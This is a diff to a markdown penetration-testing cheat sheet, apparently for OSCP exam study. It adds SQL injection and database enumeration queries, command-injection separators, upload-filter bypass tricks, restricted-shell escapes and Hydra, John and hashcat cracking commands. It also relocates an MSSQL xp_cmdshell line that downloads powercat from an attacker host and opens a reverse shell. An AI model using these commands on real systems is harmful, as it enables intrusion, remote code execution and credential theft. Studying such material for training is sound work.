@@ -146,6 +146,11 @@ ftp <TARGET IP>
 > get ../../../../<ABSOLUTE PATH TO REMOTE FILE>
 
 # Old favourite (vsftpd 2.3.4): https://www.exploit-db.com/exploits/17491
+
+# TFTP is a notable exception running on UDP port 69 - use tftp-hta instead for tftp!
+# - Note: Instead of C:\path\to\a program\file.exe, use /path/to/a program/file.exe
+tftp <TARGET IP> -c status # Check if it exists
+tftp <TARGET IP> -m binary -c get '<PATH TO FILE>' #Binary mode is more accurate...
 ```
 
 ### 1.8 Wordpress ###
@@ -179,27 +184,37 @@ hashcat -m 400 -a 0 --force <FILE WITH HASH> <WORDLIST>
 # Union injection (Type and Number of columns must be same)
 UNION SELECT <COLUMN 1, ...> FROM <DATABASE>.<TABLE>
 
-# Stacked Queries (Close previous query e.g. with ', " etc., followed by ;)
+# Stacked Queries Injection (Close previous query e.g. with ', " etc., followed by ;)
 <CLOSE PREVIOUS QUERY>; <YOUR SQL QUERY>
 
 # Time-Based Injection [A Stacked QUery] (e.g. wait 5 seconds)
 ; WAITFOR DELAY '0:0:5'; --
 
-# MySQL-based Databases (e.g. MariaDB)
-[TODO]
+# Versioning
+SELECT @@version # Version of MySQL
+SELECT version() # Version of PgSQL
+SELECT @@version # Version of MSSQL
 
-# Oracle PLSQL Database (Errors have "ORA Exception ...")
-SELECT table_name from all_tables # All tables in DB
-SELECT column_name FROM all_tab_cols WHERE table_name=<TABLE NAME> # All columns in table
-
-# MSSQL Databases interesting strings / databases / files
-@@Version # Version of MSSQL
-SELECT name FROM master.dbo.sysdabatases # All databases
+# Enumeration for Most Databases (e.g. MySQL / MSSQL)
+SELECT name FROM master.dbo.sysdatabases # All databases
 SELECT table_name FROM <DATABASE>.information_schema.tables # All tables in DB
 SELECT column_name FROM <DATABASE>.information_schema.columns WHERE table_name='<TABLE>' # All columns in table
+
+# Enumeration for Oracle PLSQL Database (Errors have "ORA Exception ...")
+SELECT table_name from all_tables # All tables in DB
+SELECT column_name FROM all_tab_cols WHERE table_name=<TABLE> # All columns in table
+
+# MSSQL .mdf files (master.mdf contains the "sa" user password hash)
 C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf # Master DB
 C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\BACKUP\master.mdf # Backup DB
 # Extract sa hash from MDF: https://blog.xpnsec.com/extracting-master-mdf-hashes/
+
+# MSSQL xp_cmdshell with "sa" (add "go" after each command if interactive)
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE; 
+EXEC xp_cmdshell 'powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://<ATTACKER IP>:<HTTP SERVER PORT>/powercat.ps1\");powercat -c <ATTACKER IP> -p <ATTACKER LISTENING PORT> -e \"cmd.exe\"'; --
 
 # MySQL User-Defined Function (UDF) exploit (https://www.exploit-db.com/exploits/1518) - Typically for local privilege escalation!
 echo "import os; os.setgid(0); os.setuid(0); os.system('/bin/bash')" >> suid.py
@@ -216,38 +231,31 @@ mysql -u root -p
 > SELECT do_system('chmod 04755 /bin/python');
 # Execute "python suid.py" to obtain root shell
 # Note: suid.py can be replaced with a C version (apply chmod on ELF instead)
-
-
-# MSSQL xp_cmdshell with "sa" (add "go" after each command if interactive)
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE; 
-EXEC xp_cmdshell 'powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://<ATTACKER IP>:<HTTP SERVER PORT>/powercat.ps1\");powercat -c <ATTACKER IP> -p <ATTACKER LISTENING PORT> -e \"cmd.exe\"'; --
 ```
 
 ### 1.10 Command Injection ###
 
-**Objective:** If a specific system command can be executed, attempt to execute another command after it
+**Objective:** If a specific system command can be executed, attempt to execute another command after it. Sometimes this involves bypassing a Regex (Regular Expression) filter.
 
 ```sh
-# Standard example (e.g. ping -c 1 <PAYLOAD>)
-; <COMMAND>
-
-# Command Injection
+# Standard example (e.g. ping -c 1 <FILL IN THE FOLLOWING>), <COMMAND> is what you want executed
+;<COMMAND>
+%0a<COMMAND>
+| <COMMAND>
+|| <COMMAND>
+&& <COMMAND>
 ```
 
 ### 1.11 File Filter Bypass ###
 
-**Objective:** If a file upload function has filters in place, attempt to bypass the filter for successful file upload.
-
-```sh
-TODO
-```
+**Objective:** If a file upload function has filters in place, attempt to bypass the filter for successful file upload. Some possible techniques include:
+* Adding `%00` for **null-byte injection** to prevent automatic extension being appended (e.g. .php, .txt etc.)
+* Prepend `GIF89a` to fool mechanism to treat it as a .gif file
+* Change `Content-Type` to `image/png` to fool mechanism to treat it as a .png file
 
 ### 1.12 Escaping Restricted Bash ###
 
-**Objective:** Obtain a fully functional shell from a restricted shell (e.g. rbash / rksh / rzsh / lshell etc.)
+**Objective:** Obtain a fully functional shell from a restricted shell (e.g. rbash / rksh / rzsh / lshell etc.) Some examples are outlined below:
 
 ```sh
 # This is a list of possibilities, refer to specific shell for escape options
@@ -264,7 +272,27 @@ nmap --interactive
 perl -e 'system("sh -i");'
 php -a                              # Interactive PHP - exec("sh -i");
 vi                                  # (or vim) - Run in command mode --- :!/bin/sh
+```
 
+### 1.13 Password Cracking and Bruteforce ###
+
+**Objective:** Given a login screen / hash, enumerate all possibilities for a correct credential. Knowing either user and/or password significantly reduces the search space. Examples below are using **dictionary attacks** but you can bruteforce in practice with the same tools as well.
+
+```sh
+# Hydra Bruteforce for SSH (other protocols possible too) - 5 parallel tasks
+hydra -l <USER> -P <WORDLIST> <TARGET IP> -t 5 ssh
+
+# Unshadow tool (combine /etc/passwd and /etc/shadow) [output as "unshadowed"]
+unshadow <PASSWD FILE> <SHADOW FILE> > unshadowed
+
+# John-The-Ripper
+# Note: <PASSWORD FILE> contains the form "user:hash", 1 per line
+john <PASSWORD FILE> --show --wordlist=<WORDLIST>
+
+# Hashcat - Launch dictionary attack by force [Non-GPU]
+# Note: <HASH FILE> contains the form "hash", 1 per line
+# Refer to https://hashcat.net/wiki/doku.php?id=hashcat for right <MODE> to use
+hashcat -m <MODE> -a 0 --force <HASH FILE> <WORDLIST>
 ```
 
 ## 2 Local Privilege Escalation (LPE) ##
@@ -831,7 +859,7 @@ Complete interactive system shell procedure
 
 ## 4 Buffer Overflow Attack ##
 
-In the context of OSCP PWK-2020, the focus appears to be on using [Immunity Debugger](https://www.immunityinc.com/products/debugger/) on Windows PE32 (x86) binaries (henceforth termed EXE) as opposed to others (e.g. gdb on ELF). This section seek to streamline and simplify that process.
+In the context of OSCP for PWK-2020, the focus appears to be on using [Immunity Debugger](https://www.immunityinc.com/products/debugger/) on Windows PE32 (x86) binaries (henceforth termed EXE) as opposed to others (e.g. gdb on ELF). This section seeks to streamline and simplify that process.
 
 A buffer overflow attack tends to follow a standard methodology.
 1. Define format / script to send payload to EXE
